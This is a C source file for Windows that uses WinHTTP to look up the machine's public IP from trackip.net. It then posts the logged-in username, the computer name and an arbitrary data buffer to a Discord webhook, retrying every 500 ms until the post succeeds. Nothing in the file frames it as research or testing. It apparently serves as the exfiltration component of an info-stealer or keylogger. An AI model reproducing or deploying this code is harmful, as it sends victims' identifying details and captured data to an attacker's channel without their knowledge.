#include "helper.h"

void getIp(HINTERNET hSession, LPSTR buffer, LPDWORD bytesRead)
{
	BOOL err = 0;
	while (1)
	{
		HINTERNET hConnect = WinHttpConnect(hSession, L"trackip.net", INTERNET_DEFAULT_HTTPS_PORT, 0);
		if (hConnect == NULL)
			continue;

		LPCWSTR accTypes[] = { L"text/plain", 0x00 };
		HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"ip", NULL, WINHTTP_NO_REFERER, accTypes, WINHTTP_FLAG_SECURE);
		if (hRequest == NULL)
		{
			WinHttpCloseHandle(hConnect);
			continue;
		}

		err = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
		if (err != 1)
		{
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		err = WinHttpReceiveResponse(hRequest, NULL);
		if (err != 1)
		{
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		err = WinHttpReadData(hRequest, buffer, 64, bytesRead);
		if (err != 1)
		{
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		break;
	}
}

void sendWebhook(HINTERNET hSession, LPCWSTR webhookId, LPCWSTR webhookToken, LPCSTR buffer, DWORD size)
{
	// Setting up Object Name
	size_t idLen = wcslen(webhookId);
	size_t tokenLen = wcslen(webhookToken);

	LPWSTR objName = calloc( idLen + tokenLen + 15, sizeof(WCHAR) );
	if (objName == NULL)
		return;

#pragma warning(disable: 6386)
	wcscpy(objName, L"api/webhooks/");
	wcscpy(objName + 13, webhookId);
	objName[idLen + 13] = '/';
	wcscpy(objName + idLen + 14, webhookToken);
#pragma warning(default: 6386)

	// Setting up Payload
	LPCSTR username = getenv("USERNAME");
	LPCSTR pcname = getenv("COMPUTERNAME");
	
	size_t userLen = strlen(username);
	size_t pcLen = strlen(pcname);

	LPSTR payload = calloc(userLen + pcLen + size + 19, sizeof(CHAR) );
	if (payload == NULL)
	{
		free(objName);
		return;
	}

	strcpy(payload, "{\"content\":\"");
	strcpy(payload+12, username);
	payload[userLen+12] = '@';
	strcpy(payload + userLen + 13, pcname);
	payload[userLen + pcLen + 13] = ':';
	payload[userLen + pcLen + 14] = ' ';
	strcpy(payload + userLen + pcLen + 15, buffer);
	strcpy(payload + userLen + pcLen + size + 15, "\"}\n");

	// Setting up Accept Types
	LPCWSTR accTypes[] = { L"*/*", 0x00 };
	LPCWSTR headers = L"Content-Type: application/json\r\n";
	
	// Sending Request
	BOOL err = 0;
	while (1)
	{
		HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
		if (hConnect == NULL)
		{
			Sleep(500);
			continue;
		}

		HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", objName, NULL, WINHTTP_NO_REFERER, accTypes, WINHTTP_FLAG_SECURE);
		if (hRequest == NULL)
		{
			Sleep(500);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		err = WinHttpSendRequest(hRequest, headers, wcslen(headers), (LPVOID)payload, strlen(payload), strlen(payload), NULL);
		if (err != 1)
		{
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		err = WinHttpReceiveResponse(hRequest, NULL);
		if(err != 1)
		{
			Sleep(500);
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			continue;
		}

		DWORD statusCode = 0;
		DWORD statSize = sizeof(statusCode);
		err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statSize, WINHTTP_NO_HEADER_INDEX);

		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);

		if (err != 1 || statusCode != 204)
		{
			Sleep(500);
			continue;
		}

		break;
	}

	free(payload);
	free(objName);
}